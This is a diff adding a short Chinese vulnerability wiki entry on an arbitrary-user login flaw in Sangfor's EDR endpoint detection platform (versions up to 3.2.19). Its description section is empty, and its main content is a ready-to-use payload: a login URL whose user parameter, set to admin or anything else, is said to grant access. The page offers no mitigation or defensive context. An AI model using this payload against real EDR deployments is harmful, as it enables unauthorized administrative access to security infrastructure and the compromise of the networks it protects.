@@ -1,0 +1,19 @@
+深信服 终端检测相应平台（EDR） 任意用户登陆漏洞
+===============================================
+
+一、漏洞简介
+------------
+
+二、漏洞影响
+------------
+
+EDR \<= v3.2.19
+
+三、复现过程
+------------
+
+payload：user后面任意填写都ok
+
+    https://www.0-sec.org:443/ui/login.php?user=admin
+
+![15.png](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意用户登陆漏洞/media/rId24.png)
